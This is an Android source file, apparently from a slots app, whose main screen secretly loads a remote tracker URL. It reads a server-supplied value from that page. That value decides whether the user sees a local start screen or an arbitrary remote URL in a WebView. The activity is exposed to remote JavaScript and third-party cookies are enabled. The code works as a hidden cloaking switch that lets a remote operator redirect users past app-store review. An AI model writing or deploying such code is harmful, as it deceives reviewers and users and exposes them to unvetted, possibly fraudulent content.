package com.testapp.slotss;


import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class MainActivity extends Activity {
    WebView webPage;

    @SuppressLint("JavascriptInterface")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (isNetworkAvailable()) {
            webPage = findViewById(R.id.webone);
            webPage.getSettings().setJavaScriptEnabled(true);
            webPage.addJavascriptInterface(this, "android");
            webPage.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    view.loadUrl("javascript: var count = document.body.childNodes; android.onData(document.getElementsByTagName('body')[0].innerText);");
                }
            });
            webPage.loadUrl("https://qaztrak.website/HTzBFrQh");
            if (Build.VERSION.SDK_INT >= 21) {
                CookieManager.getInstance().setAcceptThirdPartyCookies(webPage, true);
            } else {
                CookieManager.getInstance().setAcceptCookie(true);
            }
        }
        else {
            openActivity();
        }

    }

    @JavascriptInterface
    public void onData(String value) {
        if (value.isEmpty())
            value = "0";
        if (value.equals("0"))
            openActivity();
        else
            openWebActivity(value);
    }

    public void openActivity() {
        Intent i = new Intent(this, Start.class);

        startActivity(i);
    }

    public void openWebActivity(String value) {
        Intent i = new Intent(this, WebActivity.class);
        i.putExtra("url", value);
        startActivity(i);
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
}